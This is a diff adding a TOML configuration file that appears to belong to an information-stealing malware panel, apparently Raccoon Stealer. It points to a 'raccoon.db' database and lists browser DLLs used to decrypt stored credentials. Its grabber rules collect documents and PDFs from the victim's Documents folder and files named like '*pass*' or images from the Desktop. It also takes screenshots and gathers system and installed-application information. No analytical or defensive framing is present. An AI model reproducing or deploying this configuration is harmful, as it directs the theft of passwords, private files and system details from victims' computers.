@@ -1,0 +1,29 @@
+ConfigID = "f37bd60d60c815dbd2b8a141de515d94"
+DbPath = "./database/raccoon.db"
+HostAddr = "http://localhost:80"
+
+Libs = ["freebl3", "mozglue", "msvcp140", "nss3", "nssdbm3", "softokn3", "sqlite3", "vcruntime140"]
+
+[[Grbrs]]
+Name = "Documents"
+Path = "%USERPROFILE%\\Documents"
+Mask = "*.txt, *.doc*, *.pdf"
+Exceptions = "-"
+SizeLimit = 50
+Subfolders = 1
+Shortcuts = 0
+
+[[Grbrs]]
+Name = "Desktop"
+Path = "%USERPROFILE%\\Desktop"
+Mask = "*pass*, *.jpg, *.png"
+Exceptions = "-"
+SizeLimit = 100
+Subfolders = 1
+Shortcuts = 1
+
+Scrnsht = 1
+
+[Sstmnfo]
+Name = "System Info.txt"
+Modules = ["System Information:", "Installed applications:"]
